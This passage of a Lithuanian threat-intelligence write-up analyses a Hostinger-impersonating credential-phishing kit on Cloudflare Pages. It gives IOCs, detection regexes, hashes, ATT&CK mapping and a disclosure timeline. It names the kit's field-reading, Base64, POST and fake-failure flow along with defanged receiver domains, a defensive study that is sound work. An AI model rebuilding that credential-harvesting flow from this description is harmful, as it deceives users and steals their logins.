| Exact | Current tracker SHA-256 per 452 stebėjimus | Byte-identical current tracker versija |
| Strong | Legacy ir current tracker normalizuota struktūra | Funkciškai tas pats modulis su pakeistu endpoint |
| Strong | Septyni stabilūs resursai šešiuose pilnuose sample | Pakartotinai naudojamas UI ir script bundle |
| Medium | Current tracker domain ar hash su Hostinger kontekstu | Naudingas tik kartu su stipresniais signalais |
| Weak | Legacy tracker endpoint vienas | Cross-brand ir cross-platform reuse, ne operatoriaus įrodymas |
| Generic | Anti-inspection hash | Commodity elgsena, niekada nenaudoti vieno |

Tai svarbiausias šio tyrimo analitinis skirtumas. **Byte-identical code yra stiprus code lineage įrodymas. Jis nėra automatiškai stiprus human attribution įrodymas.**

## Alternatyvios hipotezės

Kad analysis nevirstų istorija, kur kiekvienas panašus hostname staiga priklauso vienam supervillain'ui, verta laikyti kelias hipotezes:

### H1: vienas operatorius ir viena deployment pipeline

Už šią hipotezę kalba vienodo formato 24 raidžių vardai, stabilus exact core, tracker versijų perėjimas, update-in-place ir tas pats Hostinger UI bundle.

### H2: vienas kit'o kūrėjas, keli deployer'iai

Byte-identical bundle gali būti parduodamas, dalinamas ar valdomas kaip service. Randomizuotą naming funkciją galėjo gauti visi klientai.

### H3: kopijuotas kit'as su bendra infrastruktūros liekana

Operatoriai galėjo nusikopijuoti paketą kartu su hardcoded Render endpoint'ais ir parametrais. Tokiu atveju backend reuse dar nereiškia bendro valdymo.

### H4: keli moduliai iš platesnio builder'io

Cross-brand parametrų gramatika, tracker endpoint ir generic anti-inspection gali būti bendro builder'io komponentai, o Hostinger core yra viena atskira tema.

Siaurą 298 task-query ir 299 cross-pivot union Hostinger vardų family gerai paaiškina vienodas deployment modelis ir versijuotas paketas. Tai savaime neleidžia pasirinkti H1 vietoje H2 ar H3, nes visos trys gali sukurti tuos pačius viešus artefaktus. H4 lieka rimta alternatyva platesniam cross-brand vaizdui. Provider account telemetry galėtų reikšmingai atskirti šias hipotezes.

## ATT&CK mapping, bet be bingo kortelės

ATT&CK mapping turi aprašyti tai, ką duomenys rodo. Jis neturi būti ritualas, kuriame užpildomos visos gražiai skambančios technikos.

| Technika | Statusas | Įrodymais pagrįstas paaiškinimas |
| --- | --- | --- |
| [T1608.005, Stage Capabilities: Link Target](https://attack.mitre.org/techniques/T1608/005/) | Observed | Archyvuotas HTML ir JavaScript sudaro klonuotą login target, skirtą credentials rinkti. |
| [T1056.003, Input Capture: Web Portal Capture](https://attack.mitre.org/techniques/T1056/003/) | Observed | Kodas skaito email ir password laukus ir paruošia jų perdavimą iš netikro portalo. |
| [T1583.006, Acquire Infrastructure: Web Services](https://attack.mitre.org/techniques/T1583/006/) | Consistent with | Naudoti Cloudflare Pages ir Render servisai, tačiau nežinoma, ar account'ai registruoti, kompromituoti, nuomoti ar dalinami. |
| [T1598.003, Phishing for Information: Spearphishing Link](https://attack.mitre.org/techniques/T1598/003/) | Not directly observed | Puslapis skirtas credential phishing, bet originali delivery žinutė ar el. laiškas nebuvo išsaugotas. |

T1566.002 ar T1204.001 šiame rinkinyje nėra tiesiogiai observed, nes neturime pirminio delivery artefakto ir vartotojo execution įvykio. Taip pat nepriskiriamas successful exfiltration. Kodas rodo intent ir destination, tačiau nei victim POST, nei receiver receipt nebuvo stebėtas.

## IOC kokybės lygiai

### Tier 1: aukšto tikslumo

| Tipas | Reikšmė | Naudojimo riba |
| --- | --- | --- |
| Hostname regex | <code>^hostinger-mail-ewgjnwrkgnkrw-[a-z]{24}\.pages\.dev$</code> | Stiprus observed deployment family indikatorius |
| Root document SHA-256 | <code>728d235b2ad22aa3e0f9147f267256d06b80e5ebd7bd61daa1499c1ab6f50af5</code> | Aukšto tikslumo, bet version-specific |
| Credential script SHA-256 | <code>9805613dfd2c4b09e3080d0fabbfb8476efff9cd57775481df5a523922b311c2</code> | Stipriausias elgsenos indikatorius iš išsaugoto rinkinio |
| Credential receiver | <code>mohamedbinsalm[.]onrender[.]com</code> | Kode aiškiai nurodytas credentials POST destination; forma nebuvo pateikta ir šitas receiver nebuvo kontaktuotas |

### Tier 2: naudoti su kontekstu

| Tipas | Reikšmė | Naudojimo riba |
| --- | --- | --- |
| Current tracker SHA-256 | <code>563824f1917c8b2be9d54cc5b3c5dbcfd1b8cc9198039a3f54fe705d08ee6d5d</code> | Geras kartu su Hostinger ar formos kontekstu |
| Current tracker domain | <code>moyin-psp-12012026[.]onrender[.]com</code> | Tracking rolė, ne credentials receiver |
| Parametrai | <code>trexxx</code>, <code>trexxcoz</code>, <code>coztrexx</code> | Platesnė cross-brand gramatika, vienų nepakanka |
| Stable UI bundle | Penki CSS hash'ai ir exact core | Naudinga static content clustering |

### Tier 3: silpni ar generic

| Tipas | Reikšmė | Kodėl silpna |
| --- | --- | --- |
| Legacy tracker domain | <code>wfrgbfchkp[.]onrender[.]com</code> | Matomas daugelyje brand'ų ir platformų |
| Legacy tracker SHA-256 | <code>b4f03187184e98f148b8fce890a35849a41f86aff938965138bf8a2346cf7d10</code> | Sena versija, naudoti tik su kontekstu |
| Anti-inspection SHA-256 | <code>9201f2ee02b6b642504b09f95e61a57a2bcff43e23c7d737473229e2e4f7d503</code> | 5 079 URLScan stebėjimai per daug skirtingų lure'ų |
| AS13335 ar <code>pages.dev</code> | Bendra platforma | Per platu ir generuoja neišvengiamus false positives |
| <code>onrender.com</code> | Bendra platforma | Render hostina daugybę teisėtų servisų |

Pilna machine-readable versija pateikta [defanged Hostinger domenų IOC rinkinyje](/assets/data/hostinger-pages-phishing-2026/hostinger-domain-inventory.csv). Hash, receiver ir tracker domenai, agreguotos išvados bei metodikos ribos lieka [viešame tyrimo artefaktų rinkinyje](/assets/data/hostinger-pages-phishing-2026/README.md).

## Detection ir hunting idėjos

### DNS ir proxy telemetry

Pirmas aukšto tikslumo kandidatas yra hostname regex:

~~~regex
^hostinger-mail-ewgjnwrkgnkrw-[a-z]{24}\.pages\.dev$
~~~

Jei toks hostas randamas DNS ar proxy log'uose, enrich'inimas turėtų tikrinti:

1. ar HTTP response hash sutampa su root arba core;
2. ar puslapis krauna <code>/js.js</code>, <code>/js1.js</code> ir <code>/jg.js</code>;
3. ar request chain turi vieną iš Render destination;
4. ar po task origin seka navigacija į teisėtą Hostinger Mail;
5. ar query turi parametrų vardus, bet telemetry išsaugo jų reikšmes tik pagal organizacijos privacy taisykles.

Nerekomenduoju saugoti ar dalintis pilnų personalizuotų query string vien tam, kad detection atrodytų turtingesnis. Parametro vardas dažnai pakankamas, o decoded email local-part jau gali būti PII.

### Static content hunting

Patikimiausia kombinacija:

~~~text
hostname regex
AND
(root SHA-256 OR credential-script SHA-256)
~~~

Jei hash pasikeičia, naudinga structural paieška:

- Hostinger brand literalas;
- formos ID <code>rcmloginuser</code> ir <code>rcmloginpwd</code>;
- <code>ai</code>, <code>pr</code> ir <code>pg</code> POST laukų kombinacija;
- <code>btoa</code> taikymas abiems credentials laukams;
- success ir error callback'uose tas pats <code>Login failed.</code> tekstas;
- redirect į teisėtą Hostinger Mail po counter padidėjimo;
- vienas iš tracker parametrų ir Render destination.

Vienas <code>btoa</code>, password field ar jQuery AJAX yra visiškai normalūs web elementai. Reikia jų kombinacijos ir brand konteksto.

### URLScan istorinis hunting

URLScan paieškoje atskirkite:

- <code>task.domain</code>, kuris rodo pradinį pateiktą campaign hostą;
- <code>page.domain</code>, kuris po redirect gali būti teisėtas;
- contacted <code>domain</code>, kuris rodo session metu paliestą infrastruktūrą;
- response hash, kuris yra stipresnis už final title;
- scan timestamp, kuris yra vienas stebėjimas, ne registration ar delivery laikas.

Paieškos rezultatus deduplikuokite pagal scan UUID ir task hostname atskirai. Tie du skaičiai atsako į skirtingus klausimus.

### Hostinger retrospektyvus lead

Dabartinės Pages response turėjo <code>Referrer-Policy: strict-origin-when-cross-origin</code>, o kit'as vėliau naviguoja į teisėtą Hostinger Mail. Priklausomai nuo browserio, privacy kontrolės ir Hostinger log'ų, teisėta sistema galėjo gauti phishing origin kaip Referer.

Hostinger galėtų patikrinti išlaikytus webmail ingress log'us pagal hostname regex. Tai yra lead, ne aukų skaitiklis. Referer nebuvimas neatmeta apsilankymo, o Referer buvimas neįrodo credentials submission.

## Koordinuotas atskleidimas

Hostinger apie finding'ą informuotas privačiai prieš publikavimą. Pilnas defanged domain-only IOC rinkinys yra viešas. Pilni URL, path'ai, query string'ai, provider ticket identifikatoriai, privatūs scan identifikatoriai ir galimai personalizuoti URLScan laukai viešai neskelbiami. Viešas artefaktų paketas sąmoningai apribotas iki medžiagos, reikalingos paskelbtoms išvadoms patikrinti.

### Pranešimo Hostinger laiko juosta

**2026-08-24, pirminis pranešimas.** Į <code>report-phishing@hostinger.com</code> išsiunčiau informaciją apie ongoing Hostinger impersonation, phishing ir credential-harvesting kampaniją. Pridėjau tuo metu turėtą evidence, kad laiškas nebūtų vien dar vienas "man šitas domenas atrodo įtartinas" pranešimas.

**2026-08-24, pirmas atsakymas.** Iš <code>security@hostinger.com</code> gavau laišką: "thanks for reaching out! at the moment, we do not accept vlunerability [sic] reports via email. However, we do have a bug bounty program in place."

Nu c'mon. Tai nebuvo vulnerability report'as, bug bounty submission ar bandymas gauti bounty už dar vieną header'į. Laiške buvo aprašyta aktyvi Hostinger impersonation ir credential-harvesting kampanija su priedais. Ar atsakęs žmogus perskaitė laišką ir jo priedus, iš template'o suprasti nepavyko. Jei aktyvus phishing report'as nukeliauja į vulnerability stalčių, tam procesui praverstų baziniai kibernetinio saugumo mokymai arba bent cyberio žodynėlis, kuriame "ongoing phishing campaign" ir "vulnerability" būtų skirtinguose puslapiuose.

**2026-08-24, patikslinimas.** Atrašiau dar kartą: "Hello once again, this is not bug bounty thing, or vulnerability report", ir iš naujo paaiškinau, kad kalbama apie aktyvią Hostinger impersonation bei credential-harvesting kampaniją.

**2026-08-25, antras atsakymas.** Hostinger atrašė "thank you for sharing report" ir nurodė, kad stebi Hostinger impersonation. Atsakymas buvo bazinis, bet bent jau šį kartą parinktas teisingas template'as. Per 2026-08-26 follow-up būsenos patikrinimą dalis praneštų domenų vis dar veikė, o rinkinyje buvo atsiradę keli nauji susiję vardai. Takedown nėra vienas stebuklingas mygtukas, todėl vien šis faktas neįrodo neveikimo. Credit where it is due.

Papildomas kudos Aurimui, Hostinger Head of Cyber Security. Jam užteko vienos žinutės per LinkedIn, kad išsiaiškintų, apie ką iš tikrųjų buvo report'as ir kur procese pasimetė jo kategorija.

Man vis tiek lieka platesnis klausimas: kiek nepriklausomų bug bounty hunter'ių ir security researcher'ių reportina active abuse, malicious script'us ar credential-harvesting infrastruktūrą, gauna nulinį arba template'inį feedback ir galiausiai prieš publikaciją nebesikreipia visai? Po šito exchange tikrai pagalvočiau du kartus prieš dar vieną active impersonation campaign report'ą tuo pačiu kanalu. Adform taip pat buvo pateikta informacija su evidence ir paaiškinimu, kas, kur ir kaip buvo nustatyta. Atsakymo negavau.

Life of an independent security researcher, matyt: padarai tyrimą, sutvarkai evidence, paaiškini, kad phishing nėra vulnerability, ir tada tikiesi, kad kas nors perskaitys bent toliau nei subject line.

Provider'iams skirti įrodymai turi būti tikslūs ir atskirti pagal vaidmenį. Hostinger yra imituojama organizacija, Cloudflare Pages pateikia statinius deployment'us, o archyvuotame kode esantys Render vardai atlieka credential arba tracking funkcijas. Nė vienas iš šių teiginių nepriskiria malicious intent paslaugos teikėjui.

Hostinger skirtame pakete prasminga pateikti executive summary, originalius ir anotuotus screenshot'us, tikslius dokumento bei core hash, pilną URL sąrašą privačiame priede, Render vaidmenis ir aiškų teiginį, kad evidence nerodo Hostinger kompromitavimo. Naudingos defensive užklausos apima koreliaciją su customer report'ais ir išlaikytais referrer duomenimis.

Viešuose URLScan rezultatuose query string ar report title gali atskleisti personalizuotus mailbox fragmentus. Evidence preservation turi išlaikyti scan identifikatorius privačiai, tačiau viešai nereikia perpublikuoti recipient identifikatorių, query token, cookie, API raktų ar provider ticket paslapčių.

## Ką šis tyrimas įrodo

- Archyvuotas kodas nuskaito login laukų reikšmes ir paruošia jų POST, o dabartiniame ribotame sample patvirtinti tie patys kit'o baitai.
- Credential ir tracker funkcijos yra atskirtos į du modulius bei skirtingus Render servisus.
- Core script'as ir UI bundle buvo stabiliai pernaudojami per daug deployment'ų.
- Dabartinis ilgo hostname family naming greičiausiai automatizuotas.
- Bent trys išlikę Pages projektai buvo atnaujinti vietoje.
- Cloudflare enforcement dalį hostų pristabdė, bet ribotame sample kit'as liko prieinamas kituose.
- Platesnė parametrų ir endpoint'ų reuse ekosistema egzistuoja per kelis brand'us.

## Ko šis tyrimas neįrodo

- Jis nenustato aukų, jų skaičiaus ar sėkmingai pateiktų credentials.
- Jis nenustato account takeover ar finansinio nuostolio.
- Jis neparodo Hostinger sistemų kompromitavimo.
- Jis neįrodo, kad visi 298 vardai buvo aktyvūs vienu metu.
- Jis neįrodo, kad vienas žmogus ar grupė valdė visus deployment'us.
- Jis nenustato operatoriaus šalies pagal CDN IP ar certificate issuer.
- Jis nepatvirtina, kad Render receiver'iai tebėra gyvi ar saugo duomenis.
- Jis neparodo originalios phishing žinutės ar delivery kanalo.
- Jis nepaverčia URLScan verdict'o tiesa ir nepaverčia verdict'o nebuvimo nekaltumu.

## Analitinio confidence santrauka

| Išvada | Confidence | Kodėl |
| --- | --- | --- |
| Credential-harvesting elgsena | High | Explicit field reads, Base64, POST, fake failures ir redirect hash patikrintame kode |
| Penki sample hostai 2026-08-24 pateikė exact kit'ą | High | Root ir 15 asset response SHA-256 sutapimai |
| 24 raidžių suffix generuojamas automatiškai | High | Vienodas ilgis, visas alfabetas ir beveik maksimali entropija |
| Daug atskirų Pages projektų | Medium-high | One-level hostname forma ir Cloudflare dokumentuotas production naming |
| Surviving projektų update-in-place | High trims hostams | Tas pats hostname, skirtingas istorinis ir dabartinis exact root hash |
| Platesnė shared kit ar builder lineage | Moderate | Parametrų, path, tracker ir anti-inspection reuse per kitus lure'us |
| Vienas operatorius visam rinkiniui | Unknown | Nėra account, payment, repository ar source IP telemetry |

## Išvada

Šitas tyrimas prasidėjo nuo kelių keistai pavadintų Pages hostų ir baigėsi gana aiškiu deployment modeliu:

~~~text
automatizuotas projekto vardas
  -> kopijuotas Hostinger login
  -> stabilus credential script
  -> atskiras tracking module
  -> atskiri Render receiver'iai
  -> netikros klaidos
  -> redirect į teisėtą svetainę
~~~

Paviršiuje domenai keičiasi. Po jais kodas keičiasi gerokai lėčiau. Būtent todėl exact hash, structural flow ir module lineage duoda daugiau nei 298 atskiri URL į blocklist'ą.

Taip pat tai yra geras priminimas, kodėl CTI tyrime reikia atskirti tris dalykus:

1. **ką kodas daro**;
2. **kaip infrastruktūra kartojasi**;
3. **kas ją valdo**.

Pirmus du šioje byloje galima pagrįsti gana stipriai. Trečiam reikia provider'io ar teisėsaugos duomenų. Jeigu trečią atsakymą sugalvotume vien iš random raidžių ir shared CDN IP, tai jau būtų ne threat intelligence, o fan fiction su IOC lentele.

Turimas evidence nerodo Hostinger sistemų kompromitavimo. Jis rodo, kad Hostinger identitetas buvo panaudotas apgaulei. Cloudflare ir Render nėra threat actor. Jie yra platformos, kuriose konkretūs customer deployment'ai atliko skirtingas kampanijos funkcijas. URLScan nėra victim telemetry. Jis yra point-in-time stebėjimo šaltinis.

Tokios ribos nedaro finding'o silpnesnio. Jos padaro jį patikimesnį.

## Vieši tyrimo artefaktai

Sanitizuotas, publikavimui paruoštas evidence paketas pateiktas [Hostinger Pages phishing tyrimo artefaktų rinkinyje](/assets/data/hostinger-pages-phishing-2026/README.md). Jo [pilname defanged domenų IOC rinkinyje](/assets/data/hostinger-pages-phishing-2026/hostinger-domain-inventory.csv) yra 302 Hostinger-labelled Pages vardai per skirtingas roles ir vienas PythonAnywhere redirect-context vardas, o confirmed domenai atskirti nuo lead-only bei contextual įrašų. Pakete taip pat yra hash, išvestinė hostname statistika, metodikos pastabos, evidence failų manifestas ir evidence boundary dokumentacija. Rinkinyje nėra pilnų task URL, path'ų, query string'ų, pašto dėžučių fragmentų, raw response body, API raktų, privačių scan identifikatorių, provider ticket duomenų ar lokalių darbo aplinkos kelių.

Originalaus URLScan evidence manifest SHA-256:

~~~text
d6be97aa5b5e9356a81c899b8f615cc753383e3b00a0543026b335af3bdb59ad
~~~

Dalinio platesnės lineage evidence manifest SHA-256:

~~~text
d1e519a9dd46bc76e9c5447d8066c7e21c93a44035feb38e6d998195620c0119
~~~

Antras hash susietas tik su aiškiai daline acquisition būsena. Jeigu vėliau bus surinkti likę intervalai, hash ir visi platesnės lineage skaičiai bus versijuojami, o ne tyliai perrašomi.

Straipsnyje pateiktas hostname analizės fragmentas yra iliustracinis, ne iš operatoriaus gautas source code. Viešame rinkinyje nėra komandos, galinčios kontaktuoti kampanijos infrastruktūrą.

## Šaltiniai

Platformų ir reporting teiginiams naudoti pirminiai šaltiniai:

1. [Hostinger: How to report a security issue at Hostinger](https://www.hostinger.com/support/8001450-how-to-report-a-security-issue-at-hostinger/)
2. [Hostinger: How to access Hostinger hPanel](https://www.hostinger.com/support/1583518-how-to-access-the-dashboard-in-hostinger/)
3. [Hostinger: Official Hostinger email addresses](https://www.hostinger.com/support/5394387-official-hostinger-email-addresses/)
4. [Hostinger: What to do if you receive a phishing email at Hostinger?](https://www.hostinger.com/support/8344399-what-to-do-if-you-receive-a-phishing-email-at-hostinger/)
5. [Cloudflare: Our approach to abuse](https://www.cloudflare.com/trust-hub/abuse-approach/)
6. [Cloudflare: Reporting abuse](https://www.cloudflare.com/trust-hub/reporting-abuse/)
7. [Cloudflare: Transparency Report, H1 2025](https://cf-assets.www.cloudflare.com/slt3lc6tev37/5DiewkfYlBVgef9zHC00ib/42d5fadccefce6be832b0d7cdfe7d26c/1H_2025_Cloudflare-s_Transparency_Report_Abuse_V3.pdf)
8. [Cloudflare Pages: Preview deployments](https://developers.cloudflare.com/pages/configuration/preview-deployments/)
9. [Cloudflare Pages: Direct Upload](https://developers.cloudflare.com/pages/get-started/direct-upload/)
10. [Render: Security and Trust](https://render.com/security)
11. [Render: Web Services](https://render.com/docs/web-services)
12. [URLScan: Search API Reference](https://docs.urlscan.io/apis/urlscan-openapi/search)
13. [URLScan: Result API Reference](https://urlscan.io/docs/result/)
14. [URLScan: FAQ](https://urlscan.io/docs/faq/)
15. [ODNI: ICD 203 Analytic Standards](https://www.dni.gov/files/documents/ICD/ICD-203.pdf)
16. [Cloudflare Pages: Serving Pages and SPA fallback](https://developers.cloudflare.com/pages/configuration/serving-pages/)
17. [MITRE ATT&CK T1568.002: Dynamic Resolution, Domain Generation Algorithms](https://attack.mitre.org/techniques/T1568/002/)

Du išsaugoti 2025-07-24 ir 2025-09-16 URLScan vieši stebėjimai naudoti tik implementation grammar kontekstui. Tiesioginės rezultatų nuorodos neviešinamos, nes public metadata yra potencialiai iš gavėjų gautų reikšmių; URLScan homepage sąmoningai nepateikiamas kaip šių įrašų citata.

Trečiųjų šalių klasifikacijos nėra naudojamos kaip savarankiškas vietinio malicious behavior įrodymas.
